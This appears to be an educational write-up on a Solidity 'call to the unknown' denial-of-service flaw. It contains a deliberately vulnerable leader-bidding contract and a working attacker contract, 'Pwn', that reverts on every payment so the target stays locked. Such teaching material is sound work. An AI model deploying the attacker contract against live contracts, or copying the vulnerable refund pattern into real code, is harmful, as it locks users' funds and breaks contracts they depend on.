## Call to the Unknown (DoS with unexpected revert)

```solidity
pragma solidity ^0.8.12;
contract CallToTheUnknown {
  // Highest bidder becomes the Leader. 
  // Vulnerable to DoS attack by an attacker contract which reverts all transactions to it.

    address public currentLeader;
    uint public highestBid;

    fallback() external payable {
        require(msg.value > highestBid);
        require(payable(currentLeader).send(highestBid)); // Refund the old leader, if it fails then revert
        currentLeader = msg.sender;
        highestBid = msg.value;
    }
}

contract Pwn {
  // call become leader
  // CallToTheUnknown  calltotheunknown;
  //   constructor(address addr)  {
  //       calltotheunknown = CallToTheUnknown(payable(addr));
  //   }

  function becomeLeader(address payable addr) payable external{
      (bool sent, ) = addr.call{value: msg.value}("");
      require(sent, "Failed to send Ether");
  }
    
  // reverts anytime it receives ether, thus cancelling out the change of the leader
  fallback() payable external {
    revert();
  }
}
```











## About the Contract 

In this case, an attacker’s contract could first claim leadership by sending enough ether to the insecure contract. Then, the transactions of another player who would attempt to claim leadership would throw due to line 25 in the above snippet.

Although a simple attack, this causes a permanent denial of service to the contract rendering it useless. This can be found in other ponzi scheme contracts that follow the same pattern.
